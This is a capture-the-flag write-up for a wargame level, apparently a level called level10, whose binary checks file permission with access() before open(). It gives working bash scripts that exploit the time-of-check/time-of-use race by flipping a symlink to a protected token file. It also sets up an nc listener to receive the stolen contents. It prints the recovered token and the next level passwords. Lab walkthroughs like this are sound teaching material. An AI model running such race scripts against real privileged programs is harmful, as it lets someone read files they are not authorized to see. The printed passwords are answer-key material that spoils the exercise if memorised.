Same situation, an executable and a file called token

We can’t read the token and when we execute the file it ask us to give something to connect to

Doing `strings` we find some interesting lines:

```jsx
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
socket
fflush
exit
htons
connect
puts
__stack_chk_fail
printf
__errno_location
read
stdout
inet_addr
open
access
strerror
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/usr/lib/gcc/i686-linux-gnu/4.6/include
/usr/include/i386-linux-gnu/bits
/usr/include
/usr/include/netinet
level10.c
stddef.h
types.h
libio.h
sockaddr.h
stdint.h
in.h
socket.h
stdio.h
__quad_t
_old_offset
_IO_save_end
short int
size_t
_IO_write_ptr
main
_IO_buf_base
file
_markers
SOCK_CLOEXEC
SOCK_PACKET
inet_addr
level10.c
sin_family
argv
long long int
_lock
SOCK_DGRAM
_cur_column
_pos
sin_addr
_sbuf
_IO_FILE
sa_family_t
unsigned char
SOCK_RDM
argc
sin_zero
long long unsigned int
uint32_t
_shortbuf
_IO_marker
uint16_t
s_addr
__off64_t
_IO_write_base
_unused2
_IO_read_ptr
__pad5
_IO_buf_end
/home/user/level10
SOCK_SEQPACKET
_next
__pad1
__pad2
__pad3
__pad4
in_addr_t
buffer
__socket_type
SOCK_RAW
_IO_write_end
__off_t
short unsigned int
_chain
sin_port
_IO_backup_base
in_port_t
_flags2
_mode
_IO_read_base
_vtable_offset
SOCK_STREAM
GNU C 4.6.3
_IO_save_base
_fileno
host
_IO_read_end
_flags
sockaddr_in
stdout
SOCK_DCCP
_IO_lock_t
SOCK_NONBLOCK
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level10.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__i686.get_pc_thunk.bx
read@@GLIBC_2.0
data_start
printf@@GLIBC_2.0
fflush@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
htons@@GLIBC_2.0
__DTOR_END__
__data_start
puts@@GLIBC_2.0
strerror@@GLIBC_2.0
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
open@@GLIBC_2.0
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
write@@GLIBC_2.0
__libc_csu_init
_end
__errno_location@@GLIBC_2.0
_start
_fp_hw
access@@GLIBC_2.0
stdout@@GLIBC_2.0
__bss_start
main
_Jv_RegisterClasses
socket@@GLIBC_2.0
inet_addr@@GLIBC_2.0
connect@@GLIBC_2.0
_init
```

```jsx

[...]
open
access
[...]
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
```

As we see here it checks if we have access to read the file and tries to send it to a server and displays its content but we don’t have the rights or token to do it

If we go to the second page of the `access` manual we see something useful

```jsx
man 2 access
[...]
NOTES
       Warning:  Using  access()  to check if a user is autho‐
       rized to, for example,  open  a  file  before  actually
       doing so using open(2) creates a security hole, because
       the user might exploit the short time interval  between
       checking  and  opening  the file to manipulate it.  For
       this reason, the use of  this  system  call  should  be
       avoided.   (In  the  example  just  described,  a safer
       alternative  would  be  to   temporarily   switch   the
       process's  effective  user  ID  to the real ID and then
       call open(2).)
[...]
```

As described there we will exploit the time between access check and open execution to exploit it ([race condition exploit](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use#:~:text=In%20software%20development%2C%20time%2Dof,the%20results%20of%20that%20check.)).

A race condition exploit is basically to change the file pointing of a symbolic link between a file we have permission and one we don’t so access will be true and then the program will use the unauthorized file

In order to do this we will use 3 different windows of the machine:

The first one will be listening on port 6969 with `netcat` (we saw it with `strings`)

```jsx
nc -lk 6969
```

- -l for listening mode on specific port
- -k for keeping the listening mode open after each connection

In the second window we will create a script that will create a file, delete it and then create a symbolic link to exploit the time between these processes:

```bash
vim symblink.sh
#!/bin/bash

while true; do
	touch /tmp/link
	rm -f /tmp/link
	ln -s /home/user/level10/token /tmp/link
	rm -f /tmp/link
done
```

First we create a file in `/tmp` so `access` will check it, then we delete it before we create a symbolic link so `open` opens the `token` file. Then remove the symbolic link before creating it again in the infinite loop

In the last window we will create another infinite loop so we can eecute `~/level10` with the `/tmp/link` file that we created infinitely with the first script

```bash
vim spammer.sh
#!/bin/bash

while true; do
	/home/user/level10/level10 /tmp/link 10.12.250.234
done
```

Change the IP with the [localhost](http://localhost) of them machine

After a few seconds we can stop both scripts and go to the first window, where we will get something like this:

```bash
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
```

Here is the token so let’s get the flag and go on

```bash
su flag10
Password: woupa2yuojeeaaed06riuj63c

su level11
Password: feulo4b72j7edeahuete3no7c
```